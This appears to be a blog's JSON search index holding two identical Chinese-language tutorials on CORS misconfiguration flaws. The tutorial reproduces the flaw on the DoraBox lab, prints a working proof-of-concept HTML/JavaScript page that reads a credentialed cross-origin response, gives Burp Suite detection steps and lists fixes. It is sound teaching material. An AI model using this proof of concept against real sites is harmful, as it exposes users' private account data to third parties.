[{"content":"漏洞介绍 首先明白几个概念 Origin（源）、SOP（同源策略） 和 CROS（跨域资源访问） 分别是什么\nOrigin（源） 访问 Web 内容时的协议（http://）、域名（example.com）和端口（:80）三者统称为源\nOrigin详解\nSOP（同源策略（Same Origin Policy）） 同源策略是基于浏览器的安全策略，它限制了网站之间不能随意互相读取和访问对方的资源。只有请求源（本地）和目标源（服务器）相同时，才能对相应资源进行读取。\n比方说黑客构建了一个站点，假如没有同源策略，你访问了这个恶意站点，那么黑客就可以获取到你访问页面的响应内容\n同源策略详解\nCORS（跨域资源共享（Cross-Origin Resource Sharing）） 随着发展，业务不满足于内部的资源访问，于是便有了CORS（跨域资源共享）机制，开发者可以配置具体允许哪些源对服务器的资源进行访问，但是如果未进行配置，用户只要在请求标头 Origin 字段中加入允许访问的地址，那么就可以构建任意的可允许访问的源（Access-Control-Allow-Origin）\n通常 Access-Control-Allow-Origin 字段会在服务器的相应数据包内\n请求标头Origin详解\n同源的例子\nhttp://example.com http://example.com/1.asp http://example.com/2.asp 不同源的例子\nhttp://example.com https://example.com http://example.com:8080 漏洞的产生\n上文提到了 请求标头 Origin 是可以构建的，假设服务器没有对字段做严格的限制，那么我们可以构造任意字段，让服务器的资源可提供给任意的第三方服务器。\n那么服务器同时满足下面三点要求，则可能构成CORS漏洞\n开启了 CORS（跨域资源共享） 未对Origin（请求标头）的内容做限制 未限制 Access-Control-Allow-Origin（允许访问的源） 字段 漏洞复现 相关靶场资源\nDoraBox靶场: https://github.com/0verSp4ce/DoraBox 本地搭建环境，访问 URL http://localhost/DoraBox/csrf/userinfo.php\n响应包内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:35:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: * Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} Access-Control-Allow-Origin:* 允许所有域都具有访问资源的权限。\nAccess-Control-Allow-Credentials: true 允许将请求的响应内容暴露给前端的JavaScript代码\nAccess-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS 允许跨域访问资源的请求方式\n在本地构建 cors.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://localhost/DoraBox/csrf/userinfo.php\u0026#34;); xhttp.withCredentials = true; xhttp.send(); } cors(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 使用浏览器打开本地文件 report.html\n请求包\n1 2 3 4 5 6 7 8 9 10 11 GET /DoraBox/csrf/userinfo.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site 响应包\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:43:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: null Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} report.html 通过 javascript 代码请求服务器资源，并且服务器返回了响应的资源，在存在 CORS 漏洞的前提下，可以通过 CORS 来访问服务器未授权的接口、或是一些用户的敏感信息。\n漏洞拓展 批量的检测方式\nBurpsuite 配置 Proxy - Options - Match and Replace 勾选 Request header Origin: foo.example.org\n历史数据包中过滤规则 Access-Control-Allow-Origin: foo.example.org\n修复方案 严格限制 Origin 字段的内容 配置 Access-Control-Allow-Origin 可访问的源 避免 Access-Control-Allow-Origin: null 信任形式建议配置为 *.example.com 或 .example.com 减少 Access-Control-Allow-Methods 允许的请求方式 参考文献 CORS跨域漏洞学习 - Lushun CORS跨域漏洞的学习 - FreeBuf网络安全行业门户 CORS - 术语表 | MDN (mozilla.org) ","date":"2022-08-09T14:01:02+08:00","permalink":"https://kylin.moe/p/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/","title":"测试文章"},{"content":"漏洞介绍 首先明白几个概念 Origin（源）、SOP（同源策略） 和 CROS（跨域资源访问） 分别是什么\nOrigin（源） 访问 Web 内容时的协议（http://）、域名（example.com）和端口（:80）三者统称为源\nOrigin详解\nSOP（同源策略（Same Origin Policy）） 同源策略是基于浏览器的安全策略，它限制了网站之间不能随意互相读取和访问对方的资源。只有请求源（本地）和目标源（服务器）相同时，才能对相应资源进行读取。\n比方说黑客构建了一个站点，假如没有同源策略，你访问了这个恶意站点，那么黑客就可以获取到你访问页面的响应内容\n同源策略详解\nCORS（跨域资源共享（Cross-Origin Resource Sharing）） 随着发展，业务不满足于内部的资源访问，于是便有了CORS（跨域资源共享）机制，开发者可以配置具体允许哪些源对服务器的资源进行访问，但是如果未进行配置，用户只要在请求标头 Origin 字段中加入允许访问的地址，那么就可以构建任意的可允许访问的源（Access-Control-Allow-Origin）\n通常 Access-Control-Allow-Origin 字段会在服务器的相应数据包内\n请求标头Origin详解\n同源的例子\nhttp://example.com http://example.com/1.asp http://example.com/2.asp 不同源的例子\nhttp://example.com https://example.com http://example.com:8080 漏洞的产生\n上文提到了 请求标头 Origin 是可以构建的，假设服务器没有对字段做严格的限制，那么我们可以构造任意字段，让服务器的资源可提供给任意的第三方服务器。\n那么服务器同时满足下面三点要求，则可能构成CORS漏洞\n开启了 CORS（跨域资源共享） 未对Origin（请求标头）的内容做限制 未限制 Access-Control-Allow-Origin（允许访问的源） 字段 漏洞复现 相关靶场资源\nDoraBox靶场: https://github.com/0verSp4ce/DoraBox 本地搭建环境，访问 URL http://localhost/DoraBox/csrf/userinfo.php\n响应包内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:35:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: * Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} Access-Control-Allow-Origin:* 允许所有域都具有访问资源的权限。\nAccess-Control-Allow-Credentials: true 允许将请求的响应内容暴露给前端的JavaScript代码\nAccess-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS 允许跨域访问资源的请求方式\n在本地构建 cors.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://localhost/DoraBox/csrf/userinfo.php\u0026#34;); xhttp.withCredentials = true; xhttp.send(); } cors(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 使用浏览器打开本地文件 report.html\n请求包\n1 2 3 4 5 6 7 8 9 10 11 GET /DoraBox/csrf/userinfo.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site 响应包\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:43:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: null Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} report.html 通过 javascript 代码请求服务器资源，并且服务器返回了响应的资源，在存在 CORS 漏洞的前提下，可以通过 CORS 来访问服务器未授权的接口、或是一些用户的敏感信息。\n漏洞拓展 批量的检测方式\nBurpsuite 配置 Proxy - Options - Match and Replace 勾选 Request header Origin: foo.example.org\n历史数据包中过滤规则 Access-Control-Allow-Origin: foo.example.org\n修复方案 严格限制 Origin 字段的内容 配置 Access-Control-Allow-Origin 可访问的源 避免 Access-Control-Allow-Origin: null 信任形式建议配置为 *.example.com 或 .example.com 减少 Access-Control-Allow-Methods 允许的请求方式 参考文献 CORS跨域漏洞学习 - Lushun CORS跨域漏洞的学习 - FreeBuf网络安全行业门户 CORS - 术语表 | MDN (mozilla.org) ","date":"2021-08-09T14:01:02+08:00","permalink":"https://kylin.moe/p/%E7%AE%80%E5%8D%95%E8%AE%B0/","title":"简单记"}]